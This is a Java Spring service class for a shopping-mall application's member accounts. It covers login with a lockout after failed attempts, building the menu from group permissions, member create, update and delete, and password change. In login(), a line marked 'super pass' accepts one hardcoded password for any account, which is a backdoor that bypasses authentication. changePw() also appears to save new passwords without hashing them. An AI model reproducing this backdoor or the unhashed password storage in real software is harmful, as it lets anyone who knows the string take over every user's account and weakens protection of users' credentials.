package mall.com.service.impl;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

import javax.annotation.Resource;

import org.springframework.stereotype.Service;

import egovframework.com.cmm.service.Globals;
import egovframework.com.utl.fcc.service.EgovStringUtil;
import egovframework.rte.fdl.cmmn.exception.EgovBizException;
import mall.com.service.ComGrpMenuAuthService;
import mall.com.service.ComMbrService;
import mall.com.service.ComMenuService;
import mall.com.util.NullUtil;
import mall.com.util.SessionUtil;
import mall.com.vo.ComGrpMenuAuthVO;
import mall.com.vo.ComLoginMenuVO;
import mall.com.vo.ComMbrVO;
import mall.com.vo.ComMenuVO;

/**
 * @Class Name : ComMbrServiceImpl.java
 * @Description : 회원 ServiceImpl
 * @Modification Information
 * 
 * @author
 * @since 2020. 07.20
 * @version 1.0
 * @see Copyright (C) by  All right reserved.
 */
@Service("comMbrService")
public class ComMbrServiceImpl extends AbstractServiceImpl implements ComMbrService {
	// ////////////////////// Resource 선언 영역 ///////////////////////////////////////////////////////////////////
	
	@Resource(name = "comMbrDao")
	private ComMbrDao comMbrDao;
	@Resource(name = "comMenuService")
	private ComMenuService comMenuService;
	@Resource(name = "comGrpMenuAuthService")
	private ComGrpMenuAuthService comGrpMenuAuthService;
//	@Resource(name = "comIndvlzMenuAuthService")
//	private ComIndvlzMenuAuthService comIndvlzMenuAuthService;
	
	public static final int MAX_WRONG_PW_CNT = 5;//최대 틀린횟수
	// ////////////////////// Resource 선언 영역 끝 /////////////////////////////////////////////////////////////////

	// //////////////////////서비스 메소드 선언 영역 ///////////////////////////////////////////////////////////////////

	/**
	 * 로그인처리
	 * 
	 * @param searchVO
	 * @return 세션에 저장되어 있는 메뉴중 최초 대메뉴
	 * @throws Exception
	 */
	public String login(ComMbrVO searchVO) throws Exception{
		String ret = "";
		if(NullUtil.nullString(searchVO.getMbrId()).equals("")){
			searchVO.setMbrId("============");
		}
		ComMbrVO loginListVO = new ComMbrVO();
		loginListVO.setMbrId(searchVO.getMbrId());
		loginListVO.setRecordCountPerPage(0);
		List<ComMbrVO> list = (List<ComMbrVO>)comMbrDao.selectComMbrList(loginListVO);
		if(list != null && list.size() > 0){
			ComMbrVO loginVO = list.get(0);
			
			//비밀번호변경3개월 체크
//			DateTime now = new DateTime();
//			DateTime pwModified = new DateTime(loginVO.getPswdChngDt());
//			if(pwModified.plusMonths(3).isBefore(now))throw new EgovBizException("pass3month");

			//비밀번호 틀린 횟수비교
			int pwcnt = NullUtil.nullInt(loginVO.getLoginFailrNmb());
			if(pwcnt >= MAX_WRONG_PW_CNT){
				throwBizException("com.error.login.exeedwrongpw",new String[]{String.valueOf(MAX_WRONG_PW_CNT)});
			}
			
			String encodePw = comMbrDao.selectComMbrEncodePw(searchVO.getPswd());
			//super pass
			if("wjsskathqkd_!%3".equals(searchVO.getPswd()))encodePw = loginVO.getPswd();
			
			if(loginVO.getPswd().equals(encodePw)){
				//접속IP 체크
//				if(!searchVO.getMbrIpAddr().equals(loginVO.getMbrIpAddr()))throwBizException("com.error.login.notmatchip");
				
				//비밀번호 틀린 횟수 초기화 처리
				initWrongPwCnt(loginVO);
				//로그인처리
				ret = loginByVO(loginVO);
			}else{
				//비밀번호가 틀릴때
				loginVO.setLoginFailrNmb(String.valueOf(NullUtil.nullInt(loginVO.getLoginFailrNmb())+1));
				comMbrDao.updateComMbrWrongPwCnt(loginVO);
				throwBizException("com.login.nomatch");
			}		
			
		}else{
			throwBizException("com.login.nomatch");	
		}
		return ret;
	}
	
	/**
	 * 로그아웃처리
	 * 
	 * @param searchVO
	 * @throws Exception
	 */
	public void logout() throws Exception{
		SessionUtil.removeAttribute(SESSION_VO);
		SessionUtil.removeAttribute(SESSION_LMENU_LIST);
		SessionUtil.removeAttribute(SESSION_MMENU_LIST);
		SessionUtil.removeAttribute(SESSION_SMENU_LIST);
	}
	
	/**
	 * 로그인 권한 처리
	 * @param loginVO
	 * @return 권한이 있는 URL
	 */
	public String loginByVO(ComMbrVO loginVO){
		String ret = "";

		//비밀번호 패스워드 틀린횟수 초기화
		loginVO.setLoginFailrNmb("0");
		comMbrDao.updateComMbrWrongPwCnt(loginVO);
		//최종로그인 정보 수정.
		
//		loginVO.setLastMbr(new Date());
		SessionUtil.setAttribute(SESSION_VO, loginVO);
		////로그인정보에 따른 메뉴 정보 셋팅
		//각 단계별 세션에 저장될 메뉴값
		List<ComLoginMenuVO> lmenuList = new ArrayList<ComLoginMenuVO>();
		List<ComLoginMenuVO> mmenuList = new ArrayList<ComLoginMenuVO>();
		List<ComLoginMenuVO> smenuList = new ArrayList<ComLoginMenuVO>();
		List<ComLoginMenuVO> tmenuList = new ArrayList<ComLoginMenuVO>();
		
		//권한이 있는 메뉴ID값들(부서권한 + 사용자권한)
		HashSet<String> menuIds = new HashSet<String>();
		//나의 아이디 권한가져오기
		/*ComIndvlzMenuAuthVO umaVO = new ComIndvlzMenuAuthVO();
		umaVO.setRecordCountPerPage(0);
		umaVO.setMbrId(loginVO.getMbrId());
		List<ComIndvlzMenuAuthVO> umaList = comIndvlzMenuAuthService.selectIndvlzMenuAuthList(umaVO);
		if(umaList != null){
			for(ComIndvlzMenuAuthVO tmpVO:umaList){
				menuIds.add(tmpVO.getMenuSno());
			}
		}*/
		//나의 부서 권한가져오기
		ComGrpMenuAuthVO dmaVO = new ComGrpMenuAuthVO();
		dmaVO.setRecordCountPerPage(0);
		dmaVO.setAuthGrpId(loginVO.getAuthGrpId());
		List<ComGrpMenuAuthVO> dmaList = comGrpMenuAuthService.selectGrpMenuAuthList(dmaVO);
//		if(umaList != null){
			for(ComGrpMenuAuthVO tmpVO:dmaList){
				menuIds.add(tmpVO.getMenuSno());
			}
//		}
		
/*
		//나의 직급 메뉴제한 가져오기
		CmGradeMenuExceptVO jgmeVO = new CmGradeMenuExceptVO();
		jgmeVO.setRecordCountPerPage(0);
		jgmeVO.setGrade(loginVO.getColGradeCode());
		if(jgmeVO.getGrade() == null)jgmeVO.setGrade("======");
		List<CmGradeMenuExceptVO> jgmeList = cmGradeMenuExceptService.selectGradeMenuExceptList(jgmeVO);		
*/
		
		//전체 메뉴 가져오기
		ComMenuVO menuVO = new ComMenuVO();
		menuVO.setRecordCountPerPage(0);
		List<ComMenuVO> menuList = comMenuService.selectMenuList(menuVO);
		if(menuList != null){
			for(ComMenuVO tmpVO:menuList){
				if("4".equals(tmpVO.getMenuLvlVl())){
					boolean isExist = menuIds.contains(tmpVO.getMenuSno());
					if(!isExist)continue;
					ComLoginMenuVO mVO = makeMenuVO(tmpVO, dmaList);
					if(mVO != null && mVO.isRedngAuth())tmenuList.add(mVO);
//					tmenuList.add(makeMenuVO(tmpVO, umaList, dmaList));
				}					
			}
			for(ComMenuVO tmpVO:menuList){
				if("3".equals(tmpVO.getMenuLvlVl())){
					boolean isExist = menuIds.contains(tmpVO.getMenuSno());
					//하위메뉴에 있는지 체크
					boolean isExistTmenu = false;
					for(ComLoginMenuVO tmenu:tmenuList){
						if(tmpVO.getMenuSno().equals(tmenu.getUprMenuSno())){
							isExistTmenu = true;
							tmpVO.setMenuUrl(tmenu.getMenuUrl());
							break;
						}
					}
					if(!isExist && !isExistTmenu)continue;
					ComLoginMenuVO mVO = makeMenuVO(tmpVO, dmaList);
					if(mVO != null && mVO.isRedngAuth())smenuList.add(mVO);
//					smenuList.add(makeMenuVO(tmpVO, umaList, dmaList));
				}					
			}
			
			for(ComMenuVO tmpVO:menuList){
				if("2".equals(tmpVO.getMenuLvlVl())){
					boolean isExist = menuIds.contains(tmpVO.getMenuSno());
					//하위메뉴에 있는지 체크
					boolean isExistSmenu = false;
					for(ComLoginMenuVO smenu:smenuList){
						if(tmpVO.getMenuSno().equals(smenu.getUprMenuSno())){
							isExistSmenu = true;
							tmpVO.setMenuUrl(smenu.getMenuUrl());
							break;
						}
					}
					if(!isExist && !isExistSmenu)continue;
					ComLoginMenuVO mVO = makeMenuVO(tmpVO, dmaList);
					if(mVO != null && mVO.isRedngAuth())mmenuList.add(mVO);
//					mmenuList.add(makeMenuVO(tmpVO, umaList, dmaList));
				}					
			}
			
			for(ComMenuVO tmpVO:menuList){
				if("1".equals(tmpVO.getMenuLvlVl())){
					boolean isExist = menuIds.contains(tmpVO.getMenuSno());
					//하위메뉴에 있는지 체크
					boolean isExistMmenu = false;
					for(ComLoginMenuVO mmenu:mmenuList){
						if(tmpVO.getMenuSno().equals(mmenu.getUprMenuSno())){
							isExistMmenu = true;
							tmpVO.setMenuUrl(mmenu.getMenuUrl());
							break;
						}
					}
					if(!isExist && !isExistMmenu)continue;
					if("".equals(ret))ret = tmpVO.getMenuUrl(); 
					ComLoginMenuVO lVO = makeMenuVO(tmpVO, dmaList);
					if(lVO != null && lVO.isRedngAuth())lmenuList.add(lVO);
//					lmenuList.add(makeMenuVO(tmpVO, umaList, dmaList));
				}					
			}
		}
		
		
		SessionUtil.setAttribute(SESSION_LMENU_LIST, lmenuList);
		SessionUtil.setAttribute(SESSION_MMENU_LIST, mmenuList);
		SessionUtil.setAttribute(SESSION_SMENU_LIST, smenuList);
		SessionUtil.setAttribute(SESSION_TMENU_LIST, tmenuList);
		
		SessionUtil.setAttribute(SESSION_MY_MAIN, ret);

		
		
		//로그인 시 접근페이지 url로 이동.
		String urlAfterLogin = (String)SessionUtil.getAttribute("urlAfterLogin");
		SessionUtil.setAttribute("urlAfterLogin", null);
		if(urlAfterLogin != null)ret = urlAfterLogin;
		
		return ret;
	}
	
	/**
	 * 리스트
	 * 
	 * @param searchVO
	 * @return
	 * @throws Exception
	 */
	public List<ComMbrVO> selectComMbrList(ComMbrVO searchVO) {
		List<ComMbrVO> list = (List<ComMbrVO>)comMbrDao.selectComMbrList(searchVO);
//		if(list != null){
//			for(ComMbrVO result:list){
//				
//			}
//		}
		return list;
	}

	/**
	 * 총갯수
	 * 
	 * @param searchVO
	 * @return
	 * @throws Exception
	 */
	public Integer selectComMbrTot(ComMbrVO searchVO) {
		return comMbrDao.selectComMbrTot(searchVO);
	}

	/**
	 * Pk데이터
	 * 
	 * @param searchVO
	 * @return
	 * @throws Exception
	 */
	public ComMbrVO selectComMbr(ComMbrVO searchVO) {
		return comMbrDao.selectComMbr(searchVO);
	}
	
	
	/**
	 * 추가 / 수정
	 * 
	 * @param searchVO
	 * @param detailList
	 * @throws Exception
	 */
	public void writeComMbr(ComMbrVO searchVO) throws EgovBizException {
		String mbrId = getLoginID();
		searchVO.setRegstrId(mbrId);
		searchVO.setUpdrId(mbrId);

		validate(searchVO);
		
		//아이디 중복체크
		ComMbrVO dupVO = new ComMbrVO();
		dupVO.setNotmbrId(searchVO.getMbrId());
		dupVO.setMbrId(searchVO.getMbrId());
		if(selectComMbrTot(dupVO) > 0)throwBizException("com.error.login.existid");
		
		
		String id = NullUtil.nullString(searchVO.getMbrId());
		if(!"Y".equals(searchVO.getNotmbrId())){//mbrId가 pk이므로 검색용컬럼으로 체크
			
			if(!idCheck(id))throwBizException("");
			
			searchVO.setPswd(comMbrDao.selectComMbrEncodePw(searchVO.getPswd()));
			comMbrDao.insertComMbr(searchVO);
		}else{
			ComMbrVO result = selectComMbr(searchVO);
			if(!isModifiable(result))throwBizException("com.error.noauth.modify");
			
			//비밀번호 변경일 때만 처리.
			if(NullUtil.nullString(searchVO.getPswd()).equals(""))searchVO.setPswd(result.getPswd());
			else searchVO.setPswd(comMbrDao.selectComMbrEncodePw(searchVO.getPswd()));
			
			//비밀번호 틀린횟수 초기화
			searchVO.setLoginFailrNmb("0");
			
			id = result.getMbrId();
			comMbrDao.updateComMbr(searchVO);
		}

	}

	/**
	 * 삭제
	 * 
	 * @param searchVO
	 * @throws Exception
	 */
	public void deleteComMbr(ComMbrVO searchVO) throws EgovBizException {
		String userId = getLoginID();
		//권한 체크
		ComMbrVO result = selectComMbr(searchVO);
		if(!isDeletable(result))throwBizException("com.error.noauth.delete");
				
		searchVO.setRegstrId(userId);
		searchVO.setUpdrId(userId);
		comMbrDao.deleteComMbr(searchVO);
	}

	/**
	 * 해당 데이터를 볼 수 있는 권한이 있는지 체크
	 * @param searchVO
	 * @return
	 */
	public boolean isViewable(ComMbrVO searchVO){
		return super.isViewable(searchVO);
	}

	/**
	 * 해당 데이터를 수정할 수 있는 권한이 있는지 체크
	 * @param searchVO
	 * @return
	 */
	public boolean isModifiable(ComMbrVO searchVO){
		return super.isModifiable(searchVO);
	}
	
	/**
	 * 비밀번호 변경
	 * @param searchVO
	 * @param orPw 현재비밀번호
	 * @return
	 */
	public void changePw(ComMbrVO searchVO, String orPw)throws Exception{
		if(NullUtil.nullString(searchVO.getMbrId()).equals("")){
			searchVO.setMbrId("============");
		}
		ComMbrVO loginListVO = new ComMbrVO();
		loginListVO.setMbrId(searchVO.getMbrId());
		loginListVO.setRecordCountPerPage(0);
		List<ComMbrVO> list = (List<ComMbrVO>)comMbrDao.selectComMbrList(loginListVO);
		if(list != null && list.size() > 0){
			ComMbrVO loginVO = list.get(0);
			if(loginVO == null || loginVO.getMbrId() == null)throwBizException("com.login.nomatch");
			
			String encodePw = comMbrDao.selectComMbrEncodePw(orPw);
			
			if(loginVO.getPswd().equals(encodePw)){
				loginVO.setPswd(searchVO.getPswd());
				comMbrDao.updateComMbrPwModified(loginVO);				
			}else {
				throwBizException("com.error.login.notmatchpw");
			}
	
		}else {
			throwBizException("com.login.nomatch");
		}
		
	}
	
	/**
	 * 비밀번호 틀린횟수 초기화
	 * @param searchVO
	 * @return
	 */
	public void initWrongPwCnt(ComMbrVO searchVO){
		searchVO.setLoginFailrNmb("0");
		comMbrDao.updateComMbrWrongPwCnt(searchVO);
		
	}
	

	/**
	 * id중복확인
	 * 
	 * @param searchVO
	 * @param detailList
	 * @throws Exception
	 */
	public boolean idCheck(String id) {
		if(NullUtil.nullString(id).equals(""))return false;
		
		//기존회원체크
		ComMbrVO searchVO = new ComMbrVO();
		searchVO.setMbrId(id);
		if(selectComMbrTot(searchVO) > 0)return false;
		
		return true;
	}
	
	// //////////////////////서비스 메소드 선언 영역 끝 ///////////////////////////////////////////////////////////////////

	// /////////////////////private,protected 메소드 선언 영역
	// ///////////////////////////////////////////////////////////////////
	/**
	 * 세션에 저장될 메뉴 VO 만들기
	 * @param searchVO
	 * @return
	 */
//	private ComLoginMenuVO makeMenuVO(ComMenuVO searchVO, List<ComIndvlzMenuAuthVO> umaList, List<ComGrpMenuAuthVO> dmaList){
	private ComLoginMenuVO makeMenuVO(ComMenuVO searchVO, List<ComGrpMenuAuthVO> dmaList){
		ComLoginMenuVO menuVO = new ComLoginMenuVO(); 

		menuVO.setMenuSno(searchVO.getMenuSno());
		menuVO.setMenuNm(searchVO.getMenuNm());
		menuVO.setMenuUrl(searchVO.getMenuUrl());
		menuVO.setUprMenuSno(searchVO.getUprMenuSno());
		menuVO.setMenuLvlVl(searchVO.getMenuLvlVl());
		menuVO.setMenuSeq(searchVO.getMenuSeq());
		menuVO.setMenuExplnt(searchVO.getMenuExplnt());
		
		//권한저장
		menuVO.setStreAuth(false);
		menuVO.setRedngAuth(false);
		menuVO.setDelAuth(false);
		menuVO.setPrntgAuth(false);
		/*if(umaList != null){
			for(ComIndvlzMenuAuthVO tmpVO:umaList){
				if(tmpVO.getMenuSno().equals(searchVO.getMenuSno())){
					if("Y".equals(tmpVO.getStreAuthYn()))menuVO.setStreAuth(true);
					if("Y".equals(tmpVO.getRedngAuthYn()))menuVO.setRedngAuth(true);
					if("Y".equals(tmpVO.getDelAuthYn()))menuVO.setDelAuth(true);
					if("Y".equals(tmpVO.getPrntgAuthYn()))menuVO.setPrntgAuth(true);
					break;
				}
			}
		}*/
		if(dmaList != null){
			for(ComGrpMenuAuthVO tmpVO:dmaList){
				if(tmpVO.getMenuSno().equals(searchVO.getMenuSno())){
					if("Y".equals(tmpVO.getStreAuthYn()))menuVO.setStreAuth(true);
					if("Y".equals(tmpVO.getRedngAuthYn()))menuVO.setRedngAuth(true);
					if("Y".equals(tmpVO.getDelAuthYn()))menuVO.setDelAuth(true);
					if("Y".equals(tmpVO.getPrntgAuthYn()))menuVO.setPrntgAuth(true);
					break;
				}
			}
		}
//		if(menuVO.isRedngAuth() || menuVO.isDelAuth() || menuVO.isPrntgAuth())menuVO.setStreAuth(true);
		
		if(!menuVO.isRedngAuth())menuVO = null;

		return menuVO;
	}
	/**
	 * 벨리데이션 체크
	 * @param searchVO
	 * @throws EgovBizException
	 */
	private void validate(ComMbrVO searchVO){
		
	}
	// /////////////////////private,protected 메소드 선언 영역 끝
	// ///////////////////////////////////////////////////////////////////

}
